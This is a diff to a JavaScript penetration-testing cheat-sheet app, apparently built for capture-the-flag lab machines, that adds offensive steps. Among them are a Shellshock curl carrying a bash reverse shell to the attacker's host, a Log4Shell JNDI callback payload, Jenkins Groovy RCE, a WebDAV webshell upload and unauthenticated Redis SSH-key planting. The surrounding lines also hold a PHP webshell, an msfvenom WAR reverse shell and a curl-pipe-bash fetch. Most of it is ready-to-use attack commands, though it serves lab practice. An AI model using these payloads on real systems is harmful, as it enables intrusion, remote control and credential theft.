@@ -595,6 +595,7 @@ const TRACKS=[
  {n:1,title:"Map the app",tag:"recon",goal:"Understand the stack and find hidden content",steps:[
    {d:"Java Spring app? check the actuators",c:"curl -s http://{HOST}/actuator | jq   # then /actuator/env /actuator/heapdump /actuator/sessions",
     l:"Spring Boot Actuator endpoints leak env vars and DB creds, a heap dump (grep it for passwords/session ids), and live session tokens you can replay as a cookie. The CozyHosting foothold."},
+   {d:"Jenkins? the Script Console is RCE",c:"# /script (or a build step) runs Groovy as the service account:\nprintln 'id'.execute().text",l:"An unauthenticated or weak-cred Jenkins at <code>/script</code> is instant RCE; also read user <code>config.xml</code> for API tokens. The Jeeves box."},
    {d:"Fingerprint, read source, check robots",c:"whatweb -a3 http://{HOST} && curl -sSik http://{HOST}/robots.txt",
     l:"View source and HTML comments. Developers leave paths, creds and hints there."},
    {d:"Directory brute force \u2014 primary (feroxbuster, kept shallow)",c:"feroxbuster -u http://{HOST} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -t 50 -x php,html,txt -C 404,403 -o loot/ferox.txt",
@@ -632,7 +633,15 @@ const TRACKS=[
    {d:"Server-side template injection",c:"# probe {{7*7}} / ${7*7} / <%= 7*7 %> ; a 49 back means SSTI, then engine-specific RCE",
     l:"HackTricks SSTI page maps each engine to its exploit payload."},
    {d:"Command injection and SSRF on any field that hits the OS or a URL",c:"# ; | `id` $(id) for cmdi ; internal URLs / 169.254.169.254 for SSRF",
-    l:"Every parameter that reaches a shell, a file path or a URL is a candidate."}
+    l:"Every parameter that reaches a shell, a file path or a URL is a candidate."},
+   {d:"Shellshock on an old CGI endpoint (/cgi-bin/)",c:"curl -H 'User-Agent: () { :;}; echo; /bin/bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"' http://{HOST}/cgi-bin/<script>.sh",
+    l:"CVE-2014-6271. Any <code>.sh</code>/<code>.cgi</code> under /cgi-bin runs bash and the header value is evaluated. <code>nmap --script http-shellshock</code> confirms it. The Shocker box."},
+   {d:"Log4Shell (JNDI) in any logged field \u2014 a header, username or User-Agent",c:"${jndi:ldap://{LHOST}/x}    # start nc -lvnp 1389, or marshalsec LDAP referral + a JNDIExploit http listener",
+    l:"CVE-2021-44228. Spray it into headers and form fields; a DNS/LDAP callback confirms it, then serve a payload class for RCE. The Unified box."},
+   {d:"GraphQL \u2014 introspect the schema, then abuse it",c:"# POST /graphql  {\"query\":\"{__schema{types{name fields{name}}}}\"}   ; tools: InQL, graphw00f, graphql-cog",
+    l:"Introspection dumps every query and mutation \u2014 often a credential query or a mutation that bypasses the UI. The Help box."},
+   {d:"Deserialization \u2014 the app accepts a serialized blob",c:"# Java:  ysoserial CommonsCollections5 'cmd'   (SnakeYAML -> marshalsec + yaml-payload)\n# .NET: ysoserial.net ViewState  |  Python: pickle __reduce__  |  Node: node-serialize IIFE (nodeshell.py)",
+    l:"A base64 blob in a cookie, parameter or __VIEWSTATE is the tell. Match the tool to the stack \u2014 Ophiuchi (SnakeYAML), Celestial (Node), the .NET ViewState boxes."}
  ],tips:["<b>Every parameter is a test surface.</b> Be systematic: one class at a time across every input."]},
  {n:4,title:"File upload and RCE",tag:"attack",goal:"Get a PHP shell onto the server and run it",steps:[
    {d:"Minimal command webshell (quick command exec)",c:"echo '<?php system($_GET[\"cmd\"]); ?>' > cmd.php",
@@ -643,6 +652,7 @@ const TRACKS=[
     l:"Find where uploads land (your dir brute helps), then browse to the uploaded file."},
    {d:"Tomcat Manager: deploy a WAR for a shell (try default creds first)",c:"# defaults: tomcat:tomcat  tomcat:s3cret  admin:admin  at /manager/html\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o rev.war\ncurl -u tomcat:s3cret -T rev.war 'http://{HOST}:8080/manager/text/deploy?path=/rev'\ncurl 'http://{HOST}:8080/rev/'   # listener up first; triggers the shell",
     l:"Very common on Java boxes (Jerry, Tabby). The Shells tool also generates the WAR. <code>/manager/text</code> is the scriptable API; brute the login with the default-creds list if the obvious pairs fail."},
+   {d:"WebDAV enabled? upload a shell with PUT",c:"davtest -url http://{HOST}    # which extensions execute?\ncurl -T shell.php http://{HOST}/shell.php    # or: cadaver http://{HOST}  then  put shell.php",l:"An <code>http-methods</code> nmap script or <code>OPTIONS</code> showing PUT is the tell. If .php/.asp is blocked, upload .txt then <code>MOVE</code> it. Old IIS/WebDAV (Grandpa/Granny) fall to CVE-2017-7269."},
    {d:"Turn a command-only webshell into a reverse shell",c:"curl -G \"http://{HOST}/cmd.php\" --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\"",
     l:"Listener up first. Or host rev.sh and call <code>?cmd=curl+{LHOST}/rev.sh|bash</code>. Payloads come from the Shells tool."},
    {d:"Start the listener before you trigger anything",c:"rlwrap nc -lvnp {LPORT}",
@@ -1021,7 +1031,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.3.1";
+const APP_VERSION="1.3.2";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
@@ -1362,7 +1372,8 @@ const SVC={
  postgres:{name:"PostgreSQL",cmds:[
    {d:"Log in (try blank / postgres)",c:"psql -h {IP} -U postgres"}]},
  redis:{name:"Redis",cmds:[
-   {d:"Info then keys",c:"redis-cli -h {IP} info   # then: keys *  |  config get dir"}]},
+   {d:"Info then keys",c:"redis-cli -h {IP} info   # then: keys *  |  config get dir"},
+   {d:"Unauth Redis to RCE: write an SSH key",c:"redis-cli -h {IP} config set dir /var/lib/redis/.ssh; redis-cli -h {IP} config set dbfilename authorized_keys; redis-cli -h {IP} -x set x < key.txt; redis-cli -h {IP} save"}]},
  rdp:{name:"RDP",cmds:[
    {d:"NTLM info",c:"nmap -p{PORT} --script rdp-ntlm-info {IP}"},
    {d:"Connect",c:"xfreerdp /v:{IP} /u:{USER} /p:{PASS} +clipboard /dynamic-resolution"}]},
